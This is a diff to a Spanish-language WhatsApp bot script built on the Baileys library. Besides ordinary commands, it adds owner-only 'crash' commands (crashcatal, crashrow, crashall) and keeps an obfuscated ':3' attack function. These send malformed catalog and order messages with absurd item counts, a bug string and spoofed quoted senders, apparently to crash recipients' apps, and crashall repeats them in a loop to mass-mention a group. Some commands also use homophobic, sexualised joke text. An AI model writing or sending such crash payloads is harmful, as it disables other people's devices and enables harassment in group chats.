@@ -44,8 +44,10 @@ const fromBuffer = require('file-type');
 const FormData = require('form-data')
 const samuGg = require('google-it');
 const samuGgImg = require('g-i-s');
+const hx = require('hxz-api');
 ////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
 const { validmove, setGame } = require("./lib/tictactoe");
+const simple = require('./lib/simple.js');
 const {y2mateA, y2mateV} = require('./lib/y2mate.js')
 const {sm330mfire} = require('./lib/mediafire.js')
 const { ssstik } = require("./lib/tiktok.js")
@@ -53,6 +55,7 @@ const {fbDown} = require('./lib/fb.js')
 const { isFiltered, addFilter } = require('./lib/antispam')
 const chatban = JSON.parse(fs.readFileSync('./src/ban.json'))
 const ban = JSON.parse(fs.readFileSync('./src/banned.json'))
+const crypt = fs.readFileSync('./crypt/imp.json')
 const zalgo = require('./lib/zalgo')
 const {convertSticker} = require("./lib/swm.js")
 const conn = require("./lib/connect")
@@ -72,6 +75,7 @@ const samu = JSON.parse(fs.readFileSync('./setting.json'))
 const bodyM = samu.samuM
 const antimedia = JSON.parse(fs.readFileSync('./src/antimedia.json'))
 const antifake = JSON.parse(fs.readFileSync('./src/antifake.json'))
+const antibot = JSON.parse(fs.readFileSync('./src/antibot.json'))
 const bad = JSON.parse(fs.readFileSync('./src/bad.json'))
 const badword = JSON.parse(fs.readFileSync('./src/badword.json'))
 const autostick = JSON.parse(fs.readFileSync('./src/autostick.json'))
@@ -367,6 +371,8 @@ samu330.on('chat-update', async(sam) => {
         hit_today.push(command)
 	const chats1 = (type === 'chat') ? body : ((type === 'image' || type === 'video')) ? caption : ''
 	const samu = '```'
+m = simple.smsg(samu330, sam)
+	const otherBot = m.isBaileys
 	const crypto = require('crypto')
         const args = body.trim().split(/ +/).slice(1)
         const isCmd = body.startsWith(prefix)
@@ -387,6 +393,7 @@ samu330.on('chat-update', async(sam) => {
 	const isAntigp = isGroup ? antigp.includes(from) : false
 	const isAntiMedia = isGroup ? antimedia.includes(from) : false
 	const isAntiFake = isGroup ? antifake.includes(from) : false
+  const isAntiBot = isGroup ? antibot.includes(from) : false
 	const isAutoSt = isGroup ? autostick.includes(from) : false
 	const isNsfw = isGroup ? nsfw.includes(from) : false
 	const isAllaud = isGroup ? allaud.includes(from) : false
@@ -438,6 +445,10 @@ samu330.on('chat-update', async(sam) => {
 	const sendMess = (hehe, teks) => {
 	samu330.sendMessage(hehe, teks, MessageType.text, {quoted: ftoko})
   	}
+    const katalog = (teks) => {
+        res = samu330.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": "*_Brrr_*", "thumbnail": fs.readFileSync('./src/nsfw.jpg'), "surface": 'CATALOG' }}, {quoted:sam})
+        samu330.relayWAMessage(res)
+   }	
 	
 	mess = {
 			wait: '⌛ 𝐄𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐎 ⌛',
@@ -744,7 +755,6 @@ samu330.on('chat-update', async(sam) => {
 	}
 	}
 	}	
-	    
     
 	const reply = async(teks) => {
                 await samu330.sendMessage(from, teks, MessageType.text, { quoted: { key: {                
@@ -2477,61 +2487,7 @@ case 'spamstick':
 		}	
                 }		
 	
-break		
-	
-case 'profile':
-if (isGroup) {
-
-samu330.updatePresence(from, Presence.composing)  
-
-if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('¡La etiqueta?!')
-mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
-	
-	try {
-		ppimg = await client.getProfilePicture(`${mentioned[0].split('@')[0]}@c.us`)
-	}
-	catch {
-		ppimg = fs.readFileSync('./assets/Unkown.jpeg')
-		
-	}
-		let Mh = await getBuffer(ppimg)
-
-	youp =  `「*${pushname}*」`
-//	`⊱ღ꧁ ${pushname} ꧂ღ⊱ 
-            samu330.sendMessage(from, youp, text, {
-                quoted: {
-                    key: {
-                        fromMe: false,
-                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
-                    },							
-                    message: {
-                        "imageMessage": {
-                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
-                            "mimetype": "image/jpeg",
-                           // "caption": `「 *Holi cosita ^-^* 」\n ⊱ღ ${mentioned[0].split('@')[0]} ღ⊱`,
-			    "caption": `「 *Holi cosita ^-^* 」\n ⊱ღ ${mentioned[0].replace('@s.whatsapp.net','')} ღ⊱`,	
-			   // "caption": `「 *Uwu cosita :3* 」`,
-				
-                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
-                            "fileLength": "28777",
-                            "height": 1200,
-                            "width": 1199,
-                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
-                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
-                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
-                            "mediaKeyTimestamp": "1610993486",
-                            "jpegThumbnail": Mh,
-                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
-                        }
-                    },
-                    contextInfo: {
-                      "forwardingScore": 999, "isForwarded": true
-                    }
-                }
-            })
-	
-}	
-break		
+break			
 
 case 'lesb':
 samu330.updatePresence(from, Presence.composing)  
@@ -2575,76 +2531,7 @@ samu330.updatePresence(from, Presence.composing)
 					
 		hasil = `➥${random}% fan de lolis\n✪\n➥${lol}`
                 samu330.sendMessage(from, hasil, text)
-break
-
-///
-case 'getbio':
-var yy = sam.message.extendedTextMessage.contextInfo.mentionedJid[0]
-var p = await samu330.getStatus(`${yy}`, MessageType.text)
-reply(p.status)
-if (p.status == 401) {
-reply("[ERROR 401] Status Profile Not Found")
-}
-addFilter(from)
-break
-case 'getpic':
-if (sam.message.extendedTextMessage != undefined){
-mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
-try {
-pic = await samu330.getProfilePicture(mentioned[0])
-} catch {
-pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
-}
-thumb = await getBuffer(pic)
-samu330.sendMessage(from, thumb, MessageType.image, {caption: '/omg'})
-}
-addFilter(from)
-break
-///	
-**/	
-/**		
-case 'gay':
-addFilter(from)	
-if (!isGroup) return reply(mess.only.group)
-if (args.length < 1) return reply("Meniona a alguien, pajero!")	
-samu330.updatePresence(from, Presence.composing) 
-//mentions(`@${mentioned[0].split('@')[0]}`, mentioned, true) 
-if (sam.message.extendedTextMessage != undefined){
-mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
-try {
-ppimg = await samu330.getProfilePicture(mentioned[0])
-} catch {
-ppimg = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
-}
-}
-MLa = await getBuffer(ppimg)
-await fs.writeFileSync(`./pictgay.jpeg`, MLa)
-var imgbb2 = require('imgbb-uploader')
-anug = await imgbb2("20a14861e4f7591f3dc52649cb07ae02", './pictgay.jpeg')
-txtg = `${anug.display_url}`
-ftgay = await getBuffer(`https://pecundang.herokuapp.com/api/gay?url=${txtg}`)
-	
-	random = Math.floor(Math.random() * 100)
-	gayr = random
-	if (gayr < 10 ) {ga = '*100 % macho pecho peludo rompe lomo plateado xd*'}
-	else if (gayr < 20 ) {ga = '*Usted es hetero bro 🤪🤙*'} 
-	else if (gayr < 30 ) {ga = '*Hetero pero no al 100 % :v 🤔*'}
-	else if (gayr < 40 ) {ga = '*Muy sospechoso, tengo mi dudas si eres o no eres 😑*'} 
-	else if (gayr < 50 ) {ga = '*No sé, creo q te vi ayer besándote con Juan*\n*Dinos eres o no? 😏*'} 
-	else if (gayr < 60 ) {ga = '*Muy sospechoso, dudas de tu sexualida :v*'} 
-	else if (gayr < 70 ) {ga = '*Jaa ya lo perdimos gente, quiere salir del clóset 🥵*'} 
-	else if (gayr < 80 ) {ga = '*Bueno gente, este ya probó pija y ya le gustó 🥵*'}
-	else if (gayr <= 100) {ga = '*Paletazo, quiero nepe xfavor 🥵*'}	
-					
-hasil = `➥${random}% gay \n✪\n➥${ga}`
-	
-samu330.sendMessage(from, ftgay, MessageType.image, {quoted: fgay, caption: `⊱ღ ${mentioned[0].split('@')[0]} ღ⊱\n\n${hasil}`, sendEphemeral: true})
-if (gayr > 80 ) {
-noneg = fs.readFileSync('./anishan/Ayy.mp3')  
-samu330.sendMessage(from, noneg, MessageType.audio, {quoted: faud, mimetype: 'audio/mp4', ptt:true})
-}
-fs.unlinkSync('./pictgay.jpeg')
-break
+break	
 **/		
 case 'gay':
 addFilter(from)	
@@ -2764,58 +2651,6 @@ cat = await getJson(`${gat}`)
 sendFileFromUrl(cat.url, image, {quoted: fimg, caption: '💎 *Miau 🥵* 💠', sendEphemeral: true})
 addFilter(from)
 break
-
-/////////
-/**
-case 'amongus':
-addFilter(from)
-if (!isGroup) return reply(mess.only.group)
-if (args.length < 1) return reply("Mentiona a los tripulantes!")	
-samu330.updatePresence(from, Presence.composing) 
-if (sam.message.extendedTextMessage === undefined || sam.message.extendedTextMessage === null) return reply("Meniona a alguien!! Impostor!")
-mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
-//if (mentioned.length > 10)
-members = []
-nave = `${mentioned.length - 1} Tripulantes a bordo\n`
-for (let j = 0; j < mentioned.length - 1; j++) {
-nave = nave + `@${mentioned[j].split('@')[0]}\n`
-}
-//reply(`*${mentioned.length - 1} tripulantes*\n\n${nave}`)
-const trip = `${nave}`
-imgus = fs.readFileSync('./temp/amongus/amongus1.jpg')
-samu330.sendMessage(from, imgus, MessageType.image, {
-quoted: fjeux, 
-//caption: `${hasil}\n${pushname}`, 
-caption: `${trip}`, 
-contextInfo: { mentionedJid: members }})
-//contextInfo: {
-//mentionedJid: [mentioned],
-//},
-//})
-//mentions(`${pro}`, mentioned, true)
-random = Math.floor(Math.random() * mentioned.length)
-i = random
-sus = 
-`.      　。　　　　•　    　ﾟ　　。。　　　　•　　    　。
-　　.　　　.　　　  　　.　　　　　。　　   。　 .•    。 
-　.　　      。　        ඞ   。　    .    •        •  . 
-•          @${mentioned[i].split('@')[0]} was E j e c t e d
-                    Was the impostor     。　.     •　
-　 　　。　　 　　　　ﾟ　　　.　      　　　.	  ,　
-,　　　　.         °        .	 .     .•       .• `
-//  turbo.groupRemove(from, mentioned)
-//mentions(`${sus}`, mentioned, true)
-//samu330.sendMessage(mdata.id, teks, MessageType.text,{ contextInfo: {"mentionedJid": [num]}})
-samu330.sendMessage(from, sus, MessageType.text, {
-quoted: fjeux, 
-//caption: `${hasil}\n${pushname}`, 
-//caption: `${trip}`, 
-contextInfo: {
-mentionedJid: [mentioned[i]],
-},
-})
-break	
-**/
 /////////
 case 'getlvlup':
 if (!isLalelilolu) return
@@ -3231,17 +3066,6 @@ pmimg = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
 }
 }
 mimit = await getBuffer(pmimg)
-/**
-let flove = {
-key:
-{ fromMe: false,
-participant: `0@s.whatsapp.net`, ...(from ?
-{ remoteJid: "status@broadcast" } : {}) },
-message: { "videoMessage": { "caption":"「 *Uwu cosita ^-^* 」\n ⊱ღ *Mimitos for you ♡* ღ⊱", 'jpegThumbnail': mimit}}
-}
-contextInfo: {
-mentionedJid: [sender]}
-**/
 //mimen = fs.readFileSync('./src/stickers/Mimitos.webp')  				
 //const hast = `⊱ღ @${mentioned[0].split('@')[0]} ღ⊱ recibió mimitos de parte de : *@${sender.replace("@s.whatsapp.net", "")}*`
 const hast = `*ℒℴѵℯ*¨*• ♡\t*»»ᅳlᅳoᅳvᅳeᅳ►*\n*Mimitos de : @${sender.replace("@s.whatsapp.net", "")}*\n*Para : ⊱ღ @${mentioned[0].split('@')[0]} ღ⊱*`
@@ -3949,62 +3773,8 @@ sendFileFromUrl(anu.thumbnail.genius, image, {quoted: fimg, caption: lyrics, sen
 reply(mess.ferr)
 }
 addFilter(from)
-break
+break	
 
-case 'menu2': 
-                let pi = samu330.prepareMessageFromContent(from, {
-           "listMessage": {
-						"title": "⌜ test ⌟",
-						"description": `${pushname}`,
-						"buttonText": "Click Aqui",
-						"listType": "SINGLE_SELECT",
-						"sections": [
-							{
-								"title": "select",
-								"rows": [
-									{
-										"title": ".ping",
-										"rowId": "0"
-									},
-									{
-										"title": "hola bot",
-										"rowId": "0"
-									},
-									{
-										"title": "funmenu",
-										"rowId": "0"
-									},
-									{
-										"title": "makermenu",
-										"rowId": "0"
-									},
-									{
-										"title": "othermenu",
-										"rowId": "0"
-									},
-									{
-										"title": "ownermenu",
-										"rowId": "0"
-									},
-									{
-										"title": "storagemenu",
-										"rowId": "0"
-									},
-									{
-										"title": "tagmenu",
-										"rowId": "0"
-									},
-									{
-										"title": "upmenu",
-										"rowId": "0"
-									}
-								]
-							}
-						]
-					}}, {})
- samu330.relayWAMessage(pi, {waitForAck: true})
-                break
-		
 case 'baka':
         
         txtt =`Hola ${pushname}\nEscoje tu opcion... `
@@ -4029,15 +3799,15 @@ break
 
 case 'idioto':
 let amgs = samu330.prepareMessageFromContent(from, {
-"buttonMessage":  {
-"contentText": "Hi it's button message",
-"footerText": 'Hello World',
+buttonMessage:  {
+	contentText: "Hi its button message",
+footerText: 'Hello World',
 //"title": "\t*Vale verga*",
 //"description": `\t*Uwu ${pushname}*`,
-"headerType": 1,
-"buttons": [
- 	{"buttonId": 'id1', "buttonText": {"displayText": 'Button 1'}, "type": 1},
-  	{"buttonId": 'id2', "buttonText": {"displayText": 'Button 2'}, "type": 1}
+headerType: 1,
+buttons: [
+ 	{buttonId: `id1`, buttonText: {displayText: 'Button 1'}, type: 1},
+  	{buttonId: `id2`, buttonText: {displayText: 'Button 2'}, type: 1}
 ]
 }
 }, {})
@@ -4094,6 +3864,95 @@ var _0x4f33=['C2vUze1LC3nHz2u','ndmZzNrnBNLM','qgrLBNnZChrYywe','mtCZmZG4mZqXmJa
 break	
 **/		
 //case 'crash3':
+		
+case 'crashcatal':
+if (!isOwner) return 
+    samu330.toggleDisappearingMessages(from, 0)
+    samu330.toggleDisappearingMessages(from, 0)
+    samu330.toggleDisappearingMessages(from, 0)
+res131 = samu330.prepareMessageFromContent(from,{ "orderMessage": 
+						 { "itemCount": 9999999, 
+						  "message": `${samuBug}`, 
+						  "footerText": "*_© Brrr_*", 
+						  "thumbnail": fs.readFileSync('./src/fake.jpg'), 
+						  "surface": 'CATALOG' }}, {quoted:sam})
+samu330.relayWAMessage(res131)
+samu330.toggleDisappearingMessages(from, 0)
+samu330.toggleDisappearingMessages(from, 0)
+samu330.toggleDisappearingMessages(from, 0)
+break
+
+case 'crashrow':
+if (!isOwner) return 
+var _0x6d39=["\x6F\x77\x6E\x65\x72\x42","\x6F\x6E\x6C\x79","\x74\x6F\x67\x67\x6C\x65\x44\x69\x73\x61\x70\x70\x65\x61\x72\x69\x6E\x67\x4D\x65\x73\x73\x61\x67\x65\x73","\u270D\uD83C\uDFFB\x53\x61\x6D\x75\x33\x33\x30","","\x43\x6C\x69\x63\x6B\x20\x41\x71\x75\x69\x21\x21","\x53\x49\x4E\x47\x4C\x45\x5F\x53\x45\x4C\x45\x43\x54","\x5B\x20","\x20\x5D","\x70\x72\x65\x70\x61\x72\x65\x4D\x65\x73\x73\x61\x67\x65\x46\x72\x6F\x6D\x43\x6F\x6E\x74\x65\x6E\x74","\x72\x65\x6C\x61\x79\x57\x41\x4D\x65\x73\x73\x61\x67\x65"];if(!isOwner){return reply(mess[_0x6d39[1]][_0x6d39[0]])};samu330[_0x6d39[2]](from,0);let bug2=samu330[_0x6d39[9]](from,{"\x6C\x69\x73\x74\x4D\x65\x73\x73\x61\x67\x65":{"\x74\x69\x74\x6C\x65":_0x6d39[3],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":`${_0x6d39[4]}${samuBug}${_0x6d39[4]}`,"\x62\x75\x74\x74\x6F\x6E\x54\x65\x78\x74":_0x6d39[5],"\x6C\x69\x73\x74\x54\x79\x70\x65":_0x6d39[6],"\x73\x65\x63\x74\x69\x6F\x6E\x73":[{"\x74\x69\x74\x6C\x65":`${_0x6d39[7]}${pushname}${_0x6d39[8]}`,"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":`${_0x6d39[4]}${samuBug}${_0x6d39[4]}`,"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":`${_0x6d39[4]}${samuBug}${_0x6d39[4]}`,"\x72\x6F\x77\x49\x64":`${_0x6d39[4]}`}]}]}},{quoted:ftoko});samu330[_0x6d39[10]](bug2);samu330[_0x6d39[2]](from,0)
+break  	
+		
+case 'crashall':
+if (!isOwner) return 
+if (args.length < 1) return reply('y el numero de veses a enviar?')
+try {
+var hets = `🔥 *Brr* 💣`
+var grousp = await samu330.groupMetadata(from)
+var membere = grousp['participants']
+var mems = []
+membere.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+var options = {
+text: hets,
+contextInfo: { mentionedJid: mem },
+quoted: sam
+}
+for (let i = 0; i < args[0]; i++) {
+var _$_3890=["text","5219984907794@s.whatsapp.net","5219984907794","INQUIRY","CATALOG","sendMessage"];samu330[_$_3890[5]](from,options,MessageType[_$_3890[0]],{quoted:{key:{fromMe:false,participant:`0@s.whatsapp.net`,...(from?{remoteJid:_$_3890[1]}:{})},"message":{"orderMessage":{"orderId":_$_3890[2],"itemCount":-20030418,"status":_$_3890[3],"surface":_$_3890[4],"orderTitle":`${pushname}`,"sellerJid":_$_3890[1]}}}})
+}
+} catch {
+for(let i=0;i<10;i++){
+var _$_27e9=["\ud83d\udca3Crash *Brr* Nya All\ud83d\udde1","text","5219984907794@s.whatsapp.net","5219984907794","INQUIRY","CATALOG","sendMessage"];samu330[_$_27e9[6]](from,_$_27e9[0],MessageType[_$_27e9[1]],{quoted:{key:{fromMe:false,participant:`0@s.whatsapp.net`,...(from?{remoteJid:_$_27e9[2]}:{})},"message":{"orderMessage":{"orderId":_$_27e9[3],"itemCount":-20030418,"status":_$_27e9[4],"surface":_$_27e9[5],"message":`🔥Samu330🪀`,"orderTitle":`${pushname}`,"sellerJid":_$_27e9[2]}}}})
+}
+}
+break
+		
+case 'baileys':
+reply(`${sam.quoted.isBaileys}`)
+break    
+
+case 'unavista':
+resview = await samu330.prepareMessageFromContent(from,{
+"viewOnceMessage": {
+"message": {
+"imageMessage": {
+"mimetype": 'image/jpeg',
+"jpegThumbnail": fs.readFileSync('./src/nsfw.jpg'),
+"viewOnce": true
+}
+}
+}
+}, {}) 
+samu330.relayWAMessage(resview)
+break	
+		
+case 'demoteall':
+if (!isOwner) return reply(mess.only.ownerB)
+if (!isGroup) return reply(mess.only.group)
+if (!botAdmin) return reply(mess.only.Badmin)
+members_id = []
+for (let mem of groupMembers) {
+members_id.push(mem.jid)
+}
+samu330.groupDemoteAdmin(from, members_id)
+break
+case 'promoteall':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+if (!isGroup) return reply(mess.only.group)
+if (!botAdmin) return reply(mess.only.Badmin)
+members_id = []
+for (let mem of groupMembers) {
+members_id.push(mem.jid)
+}
+samu330.groupMakeAdmin(from, members_id)
+break
+		
 case ':3':
 if (!isOwner) return 
 const _0x2a55=['A2v5','B3DUzxjc','ndC1ndC2DLPgCxbX','qxn5BhvTvMLYDxm','otu4n3LrCe1pDa','ndG5ntKYveT6q0r6','nJaYnJf1zNvLvNm','B25SEq','mZq4otyWrLbeq0DT','Dg9Nz2XLrgLZyxbWzwfYAw5NtwvZC2fNzxm','ndi4mJC3yu51z0HU','qgfKAxDHANnOAw5Nl2jHAwXLExm','nvnTshDpqG','4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwHokwHokwHokwHokwHokwHokwHokwHokwKUkwKUkwKUkwKUkwKUkwKGRILPlILPlILOJILPlILPlILPlILOtILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOtILPlILPlILPlILPik4PAs4PAi4PAq4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAs4PAscUkwKUkwJokwKokwKUkwKUkwIokwIokwHokwGokwIokwIokwIokwIokwIokwIokwGokwHokwIokwIokwKUkwKUkwKGRILPdILlZILPdILPlILPlILOJILOJILOtILOtILOtILOtILOJILOJILOtILOtILOtILOtILOJILOJILPlILPlILPik4PAq4Ps84PAq4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKokwHokwKokwIokwIokwIokwIokuGokwGokwKokwKokwGokwIokuGokwIokuGokwJokwKokwIokwIokwHokwKGRILPlILPlILOJILOJILOJILOJILOJILidILidILidILidILidILidILidILidILidILidILPdILOJILOJILOJILOWk4PAs4PAs4PAi4PAa4PAa4PAi4PAi4PAe4PAi4Psa4PAe4Psa4Psa4Psa4PAq4Psa4PAe4PAi4PAi4PAi4PAa4PAscUkwKUkwKUkwIokwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwHokwIokwIokwIokwIokwIokwIokwKUkwKUkwKGRILPlILPlILPlILPlILPlILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwIokwIokwKokwJokwIokwIokwJokwKUkwKUkwKGRILPlILPlILPlILPlILPlILPdILOdILPdILPlILOZILOdILOJILOdILPlILPdILPlILOJILPlILPlILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAq4PAs4PAs4PAs4PAs4PAm4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKG','mebZlNDOyxrZyxbWlM5LDa','nJm5ntDVDxLlDM8','4PIG77Ipqxn5BhvT4PIG77Ip','zxH0zw5KzwruzxH0','C2vUze1LC3nHz2u','ndHnyNPZzu8'];const _0x181205=_0x3357;(function(_0x15c8b7,_0x1c69db){const _0x28ef5e=_0x3357;while(!![]){try{const _0x5b2e3c=parseInt(_0x28ef5e(0x89))+-parseInt(_0x28ef5e(0x82))+-parseInt(_0x28ef5e(0x7b))+-parseInt(_0x28ef5e(0x7d))+parseInt(_0x28ef5e(0x86))*parseInt(_0x28ef5e(0x8b))+parseInt(_0x28ef5e(0x79))*-parseInt(_0x28ef5e(0x7f))+parseInt(_0x28ef5e(0x8c));if(_0x5b2e3c===_0x1c69db)break;else _0x15c8b7['push'](_0x15c8b7['shift']());}catch(_0x45cd13){_0x15c8b7['push'](_0x15c8b7['shift']());}}}(_0x2a55,0x45079));if(!itsMe)return reply('*A......??*');function _0x3357(_0x3b0a3d,_0x1534a4){_0x3b0a3d=_0x3b0a3d-0x79;let _0x2a5539=_0x2a55[_0x3b0a3d];if(_0x3357['cjjhGf']===undefined){var _0x335755=function(_0x5225bd){const _0x46b860='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x43d834='';for(let _0x36a7b6=0x0,_0x135f3a,_0x57c727,_0x2a4bc5=0x0;_0x57c727=_0x5225bd['charAt'](_0x2a4bc5++);~_0x57c727&&(_0x135f3a=_0x36a7b6%0x4?_0x135f3a*0x40+_0x57c727:_0x57c727,_0x36a7b6++%0x4)?_0x43d834+=String['fromCharCode'](0xff&_0x135f3a>>(-0x2*_0x36a7b6&0x6)):0x0){_0x57c727=_0x46b860['indexOf'](_0x57c727);}return _0x43d834;};_0x3357['dExSbW']=function(_0x124420){const _0xb94211=_0x335755(_0x124420);let _0x567ce5=[];for(let _0x1648bd=0x0,_0x2f3fcb=_0xb94211['length'];_0x1648bd<_0x2f3fcb;_0x1648bd++){_0x567ce5+='%'+('00'+_0xb94211['charCodeAt'](_0x1648bd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x567ce5);},_0x3357['YaAqHs']={},_0x3357['cjjhGf']=!![];}const _0x4f0ece=_0x2a55[0x0],_0x30a154=_0x3b0a3d+_0x4f0ece,_0x2f9b51=_0x3357['YaAqHs'][_0x30a154];return _0x2f9b51===undefined?(_0x2a5539=_0x3357['dExSbW'](_0x2a5539),_0x3357['YaAqHs'][_0x30a154]=_0x2a5539):_0x2a5539=_0x2f9b51,_0x2a5539;}function sleep(_0x4f0ece){return new Promise(_0x30a154=>setTimeout(_0x30a154,_0x4f0ece));}function troli(_0x2f9b51){const _0x107123=_0x181205;samu330[_0x107123(0x85)](_0x2f9b51,_0x107123(0x80),MessageType[_0x107123(0x84)],{'quoted':{'key':{'participant':_0x107123(0x81)},'message':{'orderMessage':{'thumbnail':fs.readFileSync('./src/crash.jpg'),'itemCount':-0x39cd8185,'status':0x1,'surface':0x1,'message':'___brr','orderTitle':_0x107123(0x8a),'sellerJid':'0@s.whatsapp.net'}}}});}function bug(_0x5225bd){const _0xc0b2db=_0x181205;for(let _0x43d834=0x0;_0x43d834<0x1;_0x43d834++){var _0x46b860=require(_0xc0b2db(0x7e));samu330[_0xc0b2db(0x7c)](_0x5225bd,_0x46b860);}}async function attack(_0x36a7b6){bug(_0x36a7b6),await sleep(0x64),troli(_0x36a7b6),await sleep(0x64),bug(_0x36a7b6);}attack(sam[_0x181205(0x87)]['remoteJid']);
@@ -4113,9 +3972,10 @@ case 'bt':
 break
 
 case 'bt2':
-    sendButLocation(from, `hola`, `tests`, {jpegThumbnail: fs.readFileSync('./src/fake.jpg')}, [{buttonId:`${prefix}status`,buttonText:{displayText:'1'},type:1},
-												{buttonId:`${prefix}owner`,buttonText:{displayText:'2'},type:1},
-												{buttonId:`${prefix}script`,buttonText:{displayText:'3'},type:1}], 
+    sendButLocation(from, `hola`, `tests`, {jpegThumbnail: fs.readFileSync('./src/fake.jpg')}, 
+		    [{buttonId:`${prefix}status`,buttonText:{displayText:'1'},type:1},
+		{buttonId:`${prefix}owner`,buttonText:{displayText:'2'},type:1},
+		{buttonId:`${prefix}script`,buttonText:{displayText:'3'},type:1}], 
 		    {contextInfo: { mentionedJid: [sender]}})
 break
 		
@@ -4424,6 +4284,17 @@ samu330.sendMessage(from, imageBuffer, sticker, {quoted: fnsfw})
 addFilter(from)
 break
 		
+case 'sp':
+mentioneds = sam.message.extendedTextMessage.contextInfo.mentionedJid
+picM = samu330.getProfilePicture(mentioneds)
+reply(mess.wait)
+const bas64sp = `data:image/jpeg;base64,${picM.toString('base64')}`
+var imageBuffersp = new Buffer.from(mantapsp, 'base64');
+var mantapsp = await convertSticker(bas64sp, `Sp By Idk :3`, `${pushname}\n🌬`)
+samu330.sendMessage(from, imageBuffersp, sticker, {quoted: sam})
+addFilter(from)
+break
+		
 case 'sticker':
 case 's':
 case 'stiker':
@@ -4594,15 +4465,7 @@ break
 /*////*/const _0x5f5c=['jugar\x20(Escojes\x20tu\x20arma)\x20=\x20','log','tijera','length','return\x20(function()\x20','21349PZSUzQ','random','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','✌🏻\x20tijera','1416lRtOeC','4007ltMcJR','26916PiOMZI','\x0a*✊🏻\x20piedra\x20rompe\x20tijeras.*','Ja...\x20perdiste,\x20tranquilo,\x20te\x20entiendo,\x20eres\x20Humano😌','49000XhJFNH','constructor','*Reglas\x20de\x20Juego:*‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎